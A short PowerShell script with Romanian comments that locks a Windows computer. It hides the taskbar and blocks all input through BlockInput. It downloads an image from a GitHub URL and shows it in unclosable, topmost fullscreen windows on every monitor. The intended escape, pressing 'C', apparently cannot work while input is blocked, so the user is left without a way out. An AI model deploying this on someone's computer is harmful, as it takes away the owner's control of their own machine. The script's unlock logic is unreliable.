Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod pentru blocare/deblocare input și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde taskbar
$taskbar = [NativeMethods]::FindWindow("Shell_TrayWnd", "")
[NativeMethods]::ShowWindow($taskbar, 0)

# Blochează input complet
[NativeMethods]::BlockInput($true)

# Descarcă poza
$tempImage = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage -UseBasicParsing

# Lista de ferestre pentru fiecare ecran
$forms = @()
$global:inchis = $false

# Funcție pentru închiderea tuturor
function InchideTot {
    $global:inchis = $true
    [NativeMethods]::BlockInput($false)
    [NativeMethods]::ShowWindow($taskbar, 1)
    foreach ($f in $forms) {
        $f.Invoke([Action]{ $f.Close() })
    }
}

# Creează ferestre pe toate monitoarele
foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $screen.Bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.ShowInTaskbar = $false
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $img = [System.Drawing.Image]::FromFile($tempImage)
    $pb = New-Object Windows.Forms.PictureBox
    $pb.Image = $img
    $pb.SizeMode = 'Zoom'
    $pb.Dock = 'Fill'
    $form.Controls.Add($pb)

    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') {
            InchideTot
        }
    })

    $form.Add_FormClosing({
        if (-not $global:inchis) {
            $_.Cancel = $true
        }
    })

    $null = $form.Show()
    $forms += $form
}

# Pornește aplicația
[System.Windows.Forms.Application]::Run()
